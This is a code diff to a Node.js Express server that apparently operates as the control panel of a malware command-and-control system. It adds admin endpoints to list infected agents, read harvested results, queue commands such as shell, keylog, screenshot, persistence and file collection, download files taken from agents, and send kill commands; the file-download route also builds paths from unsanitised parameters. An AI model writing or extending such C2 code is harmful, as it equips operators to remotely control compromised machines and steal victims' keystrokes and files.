@@ -6,6 +6,7 @@ import { DiscordWebhook } from "./discordWebhook.js";
 import fetch from 'node-fetch';
 import path from 'path';
 import crypto from 'crypto';
+import fs from 'fs';
 
 // --- App Configuration ---
 const app = express();
@@ -134,7 +135,7 @@ async function initDatabase() {
             CREATE TABLE IF NOT EXISTS c2_commands (
                 id INT AUTO_INCREMENT PRIMARY KEY,
                 agent_id VARCHAR(64) NOT NULL,
-                command_type ENUM('shell', 'download', 'upload', 'screenshot', 'keylog', 'persistence', 'collect_data', 'collect_files') NOT NULL,
+                command_type ENUM('shell', 'download', 'upload', 'screenshot', 'keylog', 'persistence', 'collect_data', 'collect_files', 'kill_agent', 'kill_process') NOT NULL,
                 command_data TEXT NOT NULL,
                 status ENUM('pending', 'executing', 'completed', 'failed') DEFAULT 'pending',
                 result TEXT,
@@ -1001,6 +1002,120 @@ app.post('/api/c2/result', async (req, res) => {
         res.json({ status: 'success', message: 'Result submitted successfully' });
     } catch (error) {
         console.error('Error submitting command result:', error);
+        res.status(500).json({ error: 'Internal server error' });
+    }
+});
+
+// --- Admin C2 Endpoints ---
+
+// 4. Get All Agents (Admin)
+app.get('/api/admin/c2/agents', authenticateAdmin, async (req, res) => {
+    if (!dbReady) return res.status(503).json({ error: "Database not available" });
+
+    try {
+        const [agents] = await pool.query(
+            "SELECT * FROM c2_agents ORDER BY last_seen DESC"
+        );
+        res.json(agents);
+    } catch (error) {
+        console.error('Error fetching agents:', error);
+        res.status(500).json({ error: 'Internal server error' });
+    }
+});
+
+// 5. Get All Results (Admin)
+app.get('/api/admin/c2/results', authenticateAdmin, async (req, res) => {
+    if (!dbReady) return res.status(503).json({ error: "Database not available" });
+
+    try {
+        const [results] = await pool.query(
+            "SELECT r.*, c.command_type, c.command_data FROM c2_results r LEFT JOIN c2_commands c ON r.command_id = c.id ORDER BY r.created_at DESC"
+        );
+        res.json(results);
+    } catch (error) {
+        console.error('Error fetching results:', error);
+        res.status(500).json({ error: 'Internal server error' });
+    }
+});
+
+// 6. Create Command (Admin)
+app.post('/api/admin/c2/command', authenticateAdmin, async (req, res) => {
+    if (!dbReady) return res.status(503).json({ error: "Database not available" });
+
+    const { agent_id, command_type, command_data } = req.body;
+
+    if (!agent_id || !command_type || !command_data) {
+        return res.status(400).json({ error: "Agent ID, command type, and command data are required" });
+    }
+
+    try {
+        const [result] = await pool.query(
+            "INSERT INTO c2_commands (agent_id, command_type, command_data, status) VALUES (?, ?, ?, 'pending')",
+            [agent_id, command_type, command_data]
+        );
+
+        res.json({ 
+            status: 'success', 
+            message: 'Command created successfully',
+            command_id: result.insertId 
+        });
+    } catch (error) {
+        console.error('Error creating command:', error);
+        res.status(500).json({ error: 'Internal server error' });
+    }
+});
+
+// 7. Download File (Admin)
+app.get('/api/admin/c2/download/:agentId/:filename', authenticateAdmin, async (req, res) => {
+    const { agentId, filename } = req.params;
+    
+    try {
+        const filePath = path.join(__dirname, 'uploads', 'c2', agentId, filename);
+        
+        if (fs.existsSync(filePath)) {
+            res.download(filePath);
+        } else {
+            res.status(404).json({ error: 'File not found' });
+        }
+    } catch (error) {
+        console.error('Error downloading file:', error);
+        res.status(500).json({ error: 'Internal server error' });
+    }
+});
+
+// 8. Kill Agent (Admin)
+app.post('/api/admin/c2/kill/:agentId', authenticateAdmin, async (req, res) => {
+    const { agentId } = req.params;
+    const { killType = 'agent' } = req.body; // 'agent' or 'process'
+    
+    if (!dbReady) return res.status(503).json({ error: "Database not available" });
+
+    try {
+        // Create kill command
+        const commandType = killType === 'process' ? 'kill_process' : 'kill_agent';
+        const commandData = killType === 'process' ? 'self' : 'terminate';
+        
+        const [result] = await pool.query(
+            "INSERT INTO c2_commands (agent_id, command_type, command_data, status) VALUES (?, ?, ?, 'pending')",
+            [agentId, commandType, commandData]
+        );
+
+        // If killing the agent itself, mark it as compromised
+        if (killType === 'agent') {
+            await pool.query(
+                "UPDATE c2_agents SET status = 'compromised' WHERE agent_id = ?",
+                [agentId]
+            );
+        }
+
+        res.json({ 
+            status: 'success', 
+            message: `Kill command sent to agent ${agentId}`,
+            command_id: result.insertId,
+            kill_type: killType
+        });
+    } catch (error) {
+        console.error('Error creating kill command:', error);
         res.status(500).json({ error: 'Internal server error' });
     }
 });
